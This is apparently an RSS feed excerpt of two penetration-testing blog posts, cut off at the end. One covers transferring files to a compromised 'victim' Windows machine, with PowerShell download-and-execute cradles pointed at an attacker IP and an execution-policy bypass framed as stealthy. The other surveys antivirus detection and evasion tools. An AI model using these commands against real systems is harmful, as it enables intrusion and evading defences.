&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://192.168.10.128/unko.txt&amp;#39;,&amp;#39;C:\Users\Administrator\Desktop&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ransferme.txt&amp;#39;)&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://192.168.119.146/gori.ps1&amp;#39;)&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;file-transfer-withsmb&#34;&gt;File Transfer With SMB&lt;/h1&gt;
&lt;h2 id=&#34;method-1&#34;&gt;Method 1&lt;/h2&gt;
&lt;p&gt;Get &lt;code&gt;smbserver.py&lt;/code&gt;from &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;Impacket&lt;/a&gt; and run the following on your Kali Linux machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smbserver.py gori $(pwd) -smb2support -user gori -pass gorigori
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Run this on the victim’s machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;New-PSDrive -Name &amp;#34;gori&amp;#34; -PSProvider &amp;#34;FileSystem&amp;#34; -gori &amp;#34;\\&amp;lt;YOUR IP&amp;gt;\gori&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;method-2&#34;&gt;Method 2&lt;/h2&gt;
&lt;p&gt;Run this on your Kali machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smbserver.py kali .
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Run this on the victim’s machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;On victim&amp;#39;s \\&amp;lt;YOUR IP ADDRESS&amp;gt;\kali\FILE\_NAME.exe &amp;#34;whoami&amp;#34; # &amp;#34;whoami&amp;#34; confirms that it is running
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;file-transfer-with-an-httpserver&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*i6K6JFM5TTxSFf4b_ermuQ.png&#34; alt=&#34;&#34;  /&gt;

File Transfer With an HTTP Server&lt;/h1&gt;
&lt;p&gt;On your machine run:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -m http.server 80
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will start an HTTP server on port 80 with the root of the HTTP server being in the directory that you executed the command from. To get a file, run this on the victim’s machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget http://&amp;lt;YOUR IP&amp;gt;/path/to/file.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;file-transfer-with-scp-andrsync&#34;&gt;File Transfer with SCP and RSYNC&lt;/h1&gt;
&lt;p&gt;Both of these methods of file transfer occur over SSH. Secure Copy Protocol (SCP) is being deprecated, however, if you’re able to use it, the syntax is fairly simple.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;scp &amp;lt;SOURCE&amp;gt; &amp;lt;DESTINATION&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this example, we are using SCP to copy a file from a remote host to the working directory of our local machine such that our computer is on the receiving end.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;scp username@ip_address:/home/username/filename
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you are looking to transfer a file from your computer to the remote host, the following syntax can be used:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;scp filename username@ip_address:/home/username
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The same commands can be used with RYSNC by simply replacing &lt;code&gt;scp&lt;/code&gt; with &lt;code&gt;rsync&lt;/code&gt; .&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rsync &amp;lt;SOURCE&amp;gt; &amp;lt;DESTINATION&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;There are countless ways to transfer files between two computers. Among the most common methods are HTTP and FTP, but if those don’t work, there is a chance that some of the other options here will. Some honorable mentions that I didn’t go into detail on are SSHFS, SFTP, Winscp, and Samba. I hope that you were able to find value in this article and remember to never stop learning.&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*HNC0lT4gPMDU8uH0fyjRyw.png" alt=""  />
</p>
<h1 id="foreword">Foreword</h1>
<p>To avoid detection, it is best to use tools that are native to the victim’s computer.</p>
<h1 id="ftp-with-windowshost">FTP with Windows Host</h1>
<p>While having a shell on the Windows machine, start an FTP server on your host machine. Follow these steps if you don’t already have FTP server installed:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt-get install vsftpd  
</span></span><span style="display:flex;"><span>sudo service vsftpd start  
</span></span><span style="display:flex;"><span>service vsftpd status #status should be active
</span></span></code></pre></div><p>To check if your server is working, type <code>ftp localhost.</code> If you see the message “Connected to localhost”, your FTP server is running.</p>
<h2 id="accessing-file-with-interactive-shell"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*ehYiaPXjraslOYhNqIv7Zw.png" alt=""  />

Accessing File With Interactive Shell</h2>
<p>If you have an interactive shell on the Windows machine, run this command.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cscript wget.vbs http://&lt;YOUR IP&gt;/&lt;PATH TO FILE&gt; &lt;FILENAME TO SAVE AS&gt;
</span></span></code></pre></div><h2 id="accessing-file-with-non-interactive-shell">Accessing File With Non-Interactive Shell</h2>
<p>If you don’t have an interactive shell, you can’t start PowerShell.exe. A workaround is to create a PowerShell script and execute it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>storageDir <span style="color:#f92672">=</span> <span style="color:#f92672">$</span>pwd <span style="color:#f92672">&gt;</span> wget<span style="color:#f92672">.</span>ps1  
</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>webclient <span style="color:#f92672">=</span> New<span style="color:#f92672">-</span><span style="color:#a6e22e">Object</span> System<span style="color:#f92672">.</span>Net<span style="color:#f92672">.</span>WebClient <span style="color:#f92672">&gt;&gt;</span>wget<span style="color:#f92672">.</span>ps1  
</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://&lt;YOUR IP&gt;/&lt;PATH TO FILE&gt;&#34;</span> <span style="color:#f92672">&gt;&gt;</span>wget<span style="color:#f92672">.</span>ps1  
</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;output-file.exe&#34;</span> <span style="color:#f92672">&gt;&gt;</span>wget<span style="color:#f92672">.</span>ps1  
</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>webclient<span style="color:#f92672">.</span>DownloadFile(<span style="color:#f92672">$</span>url,<span style="color:#f92672">$</span>file) <span style="color:#f92672">&gt;&gt;</span>wget<span style="color:#f92672">.</span>ps1
</span></span></code></pre></div><p>To invoke<code>wget.ps1</code>, call</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>-ExecutionPolicy Bypass -noLogo -NonInteractive --- stealthly
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>powershell <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;(new-object System.Net.WebClient).DownloadFile(&#39;http://&lt;YOUR IP&gt;/&lt;FILENAME&gt;&#39;)&#34;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>IEX(New<span style="color:#f92672">-</span><span style="color:#a6e22e">Object</span> Net<span style="color:#f92672">.</span>WebClient)<span style="color:#f92672">.</span>downloadString(<span style="color:#e6db74">&#39;http://&lt;YOUR IP&gt;/&lt;FILENAME&gt;&#39;</span>)
</span></span></code></pre></div><h1 id="getting-files-through-powershell"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*nBHrLvu-D9RNlMsbTG3Wsg.jpeg" alt=""  />

Getting Files Through PowerShell</h1>
<p>On your Kali Linux machine, make a copy of the file you want to send to <code>/var/www/html/</code> . On the Window’s machine, execute the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>powershell <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;(new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.10.128/unko.txt&#39;,&#39;C:\Users\Administrator\Desktop</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">ransferme.txt&#39;)&#34;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>powershell <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;(new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.119.146/gori.ps1&#39;)&#34;</span>
</span></span></code></pre></div><h1 id="file-transfer-withsmb">File Transfer With SMB</h1>
<h2 id="method-1">Method 1</h2>
<p>Get <code>smbserver.py</code>from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> and run the following on your Kali Linux machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>smbserver.py gori $(pwd) -smb2support -user gori -pass gorigori
</span></span></code></pre></div><p>Run this on the victim’s machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>New-PSDrive -Name &#34;gori&#34; -PSProvider &#34;FileSystem&#34; -gori &#34;\\&lt;YOUR IP&gt;\gori&#34;
</span></span></code></pre></div><h2 id="method-2">Method 2</h2>
<p>Run this on your Kali machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>smbserver.py kali .
</span></span></code></pre></div><p>Run this on the victim’s machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>On victim&#39;s \\&lt;YOUR IP ADDRESS&gt;\kali\FILE\_NAME.exe &#34;whoami&#34; # &#34;whoami&#34; confirms that it is running
</span></span></code></pre></div><h1 id="file-transfer-with-an-httpserver"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*i6K6JFM5TTxSFf4b_ermuQ.png" alt=""  />

File Transfer With an HTTP Server</h1>
<p>On your machine run:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 -m http.server 80
</span></span></code></pre></div><p>This will start an HTTP server on port 80 with the root of the HTTP server being in the directory that you executed the command from. To get a file, run this on the victim’s machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wget http://&lt;YOUR IP&gt;/path/to/file.txt
</span></span></code></pre></div><h1 id="file-transfer-with-scp-andrsync">File Transfer with SCP and RSYNC</h1>
<p>Both of these methods of file transfer occur over SSH. Secure Copy Protocol (SCP) is being deprecated, however, if you’re able to use it, the syntax is fairly simple.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>scp &lt;SOURCE&gt; &lt;DESTINATION&gt;
</span></span></code></pre></div><p>In this example, we are using SCP to copy a file from a remote host to the working directory of our local machine such that our computer is on the receiving end.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>scp username@ip_address:/home/username/filename
</span></span></code></pre></div><p>If you are looking to transfer a file from your computer to the remote host, the following syntax can be used:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>scp filename username@ip_address:/home/username
</span></span></code></pre></div><p>The same commands can be used with RYSNC by simply replacing <code>scp</code> with <code>rsync</code> .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>rsync &lt;SOURCE&gt; &lt;DESTINATION&gt;
</span></span></code></pre></div><h1 id="conclusion">Conclusion</h1>
<p>There are countless ways to transfer files between two computers. Among the most common methods are HTTP and FTP, but if those don’t work, there is a chance that some of the other options here will. Some honorable mentions that I didn’t go into detail on are SSHFS, SFTP, Winscp, and Samba. I hope that you were able to find value in this article and remember to never stop learning.</p>
]]></content:encoded>
    </item>
    <item>
      <title>Antivirus Evasion: What it is and How to do it</title>
      <link>https://ally-petitt.com:443/en/posts/2022-05-30_antivirus-evasion--what-it-is-and-how-to-do-it-17f98e920704/</link>
      <pubDate>Mon, 30 May 2022 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.com:443/en/posts/2022-05-30_antivirus-evasion--what-it-is-and-how-to-do-it-17f98e920704/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*W1qjqIKKNMK9_QYWXGQzRw.png&#34; alt=&#34;picture of a bug&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;how-does-antivirus-software-actuallywork&#34;&gt;How Does Antivirus Software Actually Work?&lt;/h1&gt;
&lt;p&gt;Antivirus software acts as a defense from trojans, viruses, ransomware, spyware, adware, and much more. There are 3 main ways that it detects malware: signature-based detection, heuristic-based detection, and anomaly-based detection.&lt;/p&gt;
&lt;h2 id=&#34;signature-based-detection&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*ehROjARifrRnkEITjkFwMw.png&#34; alt=&#34;&#34;  /&gt;

Signature-Based Detection&lt;/h2&gt;
&lt;p&gt;The scanner will search for specific strings in a program and check for them in a database of known viruses. The strings are often the payload of the malicious code. If the signatures match, the activity is flagged for suspicious activity. Many of these databases store over 250,000 different signatures.&lt;/p&gt;
&lt;p&gt;Downsides to this approach:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The database only stores the values of known signatures&lt;/li&gt;
&lt;li&gt;Newer variations of malware may go undetected if their new signature is not stored in the database&lt;/li&gt;
&lt;li&gt;Viruses can be easily and quickly altered to change their signature&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;anomaly-based-detection&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*8jt-Qw_ai_h_GCSJV15fuQ.png&#34; alt=&#34;&#34;  /&gt;

Anomaly-Based Detection&lt;/h2&gt;
&lt;p&gt;Instead of referencing a static database that needs to be continuously updated, this type of detection checks the running program for patterns of . This can be referred to as an expert system. Often, these detection systems will utilize a &lt;strong&gt;machine learning model&lt;/strong&gt; that was trained using data from the past years of the company using the antivirus software.&lt;/p&gt;
&lt;h2 id=&#34;heuristic-based-detection&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*meCStYsucAG7XXY88Lnj0w.jpeg&#34; alt=&#34;&#34;  /&gt;

Heuristic-Based Detection&lt;/h2&gt;
&lt;p&gt;This is one of the few methods capable of detecting polymorphic viruses. Heuristic analysis may consist of multiple different methods, including static heuristic analysis. This technique deals with decompiling a program and comparing the source code to the source code of known viruses stored in a database.&lt;/p&gt;
&lt;p&gt;Additionally, heuristic analysis may include dynamic heuristics, a method of containing the program in a virtual machine to test what happens when the code is executed. The running program is monitored for suspicious activity such as overwriting files or self-replication.&lt;/p&gt;
&lt;h1 id=&#34;how-to-evade-antivirus-detection&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*VY6GEFR7NyUkIPcXNT49bg.jpeg&#34; alt=&#34;&#34;  /&gt;

How to Evade Antivirus Detection&lt;/h1&gt;
&lt;h2 id=&#34;on-disk-evasion&#34;&gt;&lt;strong&gt;On-Disk Evasion&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;The following are techniques used for on-disk evasion:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Obfuscation&lt;/strong&gt;- this method involves rewriting the code to appear more confusing and harder to read.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Cryptography&lt;/strong&gt;- the code will be encrypted with the decryption key stored in a stub. The program will be decrypted in memory.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Packing&lt;/strong&gt;- the code is condensed into a smaller binary file which results in a different signature on the payload.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Encoding&lt;/strong&gt;- the payload may be encoded as base64, hexadecimal, or other types of encodings.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;in-memory-evasion&#34;&gt;In-Memory Evasion&lt;/h2&gt;
&lt;p&gt;The following is a technique used for in-memory evasion:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Use Windows APIs to inject a payload into a running process&lt;/li&gt;
&lt;li&gt;Payload is executed in the memory of running process in a separate thread&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;command-line-tools&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*H6l629Qydy1pFxjjyoQn9A.jpeg&#34; alt=&#34;&#34;  /&gt;

Command-Line Tools&lt;/h2&gt;
&lt;p&gt;Here is a list of tools that can help craft undetectable payloads to bypass the antivirus software:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Veil-Evasion&lt;/li&gt;
&lt;li&gt;Shellter&lt;/li&gt;
&lt;li&gt;Invoke-Obfuscation&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;going-deeper&#34;&gt;Going Deeper&lt;/h1&gt;
&lt;p&gt;Here are some resources for those who are looking for a deeper understanding of antivirus evasion.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://youtu.be/iz1twCSJZyo&#34;&gt;Veil-Evasion Complete Tutorial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion&#34;&gt;Defense Evasion — Red Team Notes 2.0&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://youtu.be/V3_vc7BO9lU&#34;&gt;Malware Analysis Bootcamp - Extracting Strings&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://youtu.be/WmJcbDfy9L4&#34;&gt;ATT&amp;amp;CK Deep Dive: Defense Evasion&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.linode.com/docs/guides/windows-red-team-defense-evasion-techniques/&#34;&gt;Windows Red Team Defense Evasion Techniques&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*W1qjqIKKNMK9_QYWXGQzRw.png" alt="picture of a bug"  />
</p>
<h1 id="how-does-antivirus-software-actuallywork">How Does Antivirus Software Actually Work?</h1>
<p>Antivirus software acts as a defense from trojans, viruses, ransomware, spyware, adware, and much more. There are 3 main ways that it detects malware: signature-based detection, heuristic-based detection, and anomaly-based detection.</p>
<h2 id="signature-based-detection"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*ehROjARifrRnkEITjkFwMw.png" alt=""  />

Signature-Based Detection</h2>
<p>The scanner will search for specific strings in a program and check for them in a database of known viruses. The strings are often the payload of the malicious code. If the signatures match, the activity is flagged for suspicious activity. Many of these databases store over 250,000 different signatures.</p>
<p>Downsides to this approach:</p>
<ul>
<li>The database only stores the values of known signatures</li>
<li>Newer variations of malware may go undetected if their new signature is not stored in the database</li>
<li>Viruses can be easily and quickly altered to change their signature</li>
</ul>
<h2 id="anomaly-based-detection"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*8jt-Qw_ai_h_GCSJV15fuQ.png" alt=""  />

Anomaly-Based Detection</h2>
<p>Instead of referencing a static database that needs to be continuously updated, this type of detection checks the running program for patterns of . This can be referred to as an expert system. Often, these detection systems will utilize a <strong>machine learning model</strong> that was trained using data from the past years of the company using the antivirus software.</p>
<h2 id="heuristic-based-detection"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*meCStYsucAG7XXY88Lnj0w.jpeg" alt=""  />

Heuristic-Based Detection</h2>
<p>This is one of the few methods capable of detecting polymorphic viruses. Heuristic analysis may consist of multiple different methods, including static heuristic analysis. This technique deals with decompiling a program and comparing the source code to the source code of known viruses stored in a database.</p>
<p>Additionally, heuristic analysis may include dynamic heuristics, a method of containing the program in a virtual machine to test what happens when the code is executed. The running program is monitored for suspicious activity such as overwriting files or self-replication.</p>
<h1 id="how-to-evade-antivirus-detection"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*VY6GEFR7NyUkIPcXNT49bg.jpeg" alt=""  />

How to Evade Antivirus Detection</h1>
<h2 id="on-disk-evasion"><strong>On-Disk Evasion</strong></h2>
<p>The following are techniques used for on-disk evasion:</p>
<ul>
<li><strong>Obfuscation</strong>- this method involves rewriting the code to appear more confusing and harder to read.</li>
<li><strong>Cryptography</strong>- the code will be encrypted with the decryption key stored in a stub. The program will be decrypted in memory.</li>
<li><strong>Packing</strong>- the code is condensed into a smaller binary file which results in a different signature on the payload.</li>
<li><strong>Encoding</strong>- the payload may be encoded as base64, hexadecimal, or other types of encodings.</li>
</ul>
<h2 id="in-memory-evasion">In-Memory Evasion</h2>
<p>The following is a technique used for in-memory evasion:</p>
<ul>
<li>Use Windows APIs to inject a payload into a running process</li>
<li>Payload is executed in the memory of running process in a separate thread</li>
</ul>
<h2 id="command-line-tools"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*H6l629Qydy1pFxjjyoQn9A.jpeg" alt=""  />

Command-Line Tools</h2>
<p>Here is a list of tools that can help craft undetectable payloads to bypass the antivirus software:</p>
<ul>
<li>Veil-Evasion</li>
<li>Shellter</li>
<li>Invoke-Obfuscation</li>
</ul>
<h1 id="going-deeper">Going Deeper</h1>
<p>Here are some resources for those who are looking for a deeper understanding of antivirus evasion.</p>
<ul>
<li><a href="https://youtu.be/iz1twCSJZyo">Veil-Evasion Complete Tutorial</a></li>
<li><a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion">Defense Evasion — Red Team Notes 2.0</a></li>
<li><a href="https://youtu.be/V3_vc7BO9lU">Malware Analysis Bootcamp - Extracting Strings</a></li>
<li><a href="https://youtu.be/WmJcbDfy9L4">ATT&amp;CK Deep Dive: Defense Evasion</a></li>
